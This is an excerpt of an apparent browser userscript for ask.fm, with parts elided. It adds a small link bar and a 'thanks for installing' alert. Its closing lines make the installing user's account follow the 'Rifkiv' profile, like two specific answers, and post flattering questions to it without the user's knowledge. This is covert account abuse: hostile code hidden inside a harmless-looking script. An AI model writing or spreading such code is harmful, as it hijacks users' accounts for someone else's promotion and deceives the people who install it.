...
if(body != null) {
	...
	div2.innerHTML = "<div style='background-color: #00a2ff; color: #FFFFFF; border: 1px solid #00a2ff;'><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to hide'>&laquo;</a> &#8226; <a href='http://ask.fm/Rifkiv' title='My ask.fm' style='color: #FFFFFF;' onclick='alert(\'Thanks for installing this script\');'>My ask.fm</a></div> "
	...
	unsafeWindow.spoiler = function() {
		...
		for(i=1;i<=20;i++) {
			...
			div2.innerHTML = "<a onclick='spoiler()' title='Ask me something'>&laquo;</a> &#8226; <a href='http://ask.fm/Rifkiv' title='Rifkiv'>Ask me</a>"
			}
			else {
...
follow("Rifkiv");
likeThis("Rifkiv","36867970449");
likeThis("Rifkiv","36864378513");
createQuestion("Rifkiv","Followed you *-*");
createQuestion("Rifkiv","I LOVE YOU SO MUCH *o*");
createQuestion("Rifkiv","GREAT Answers!");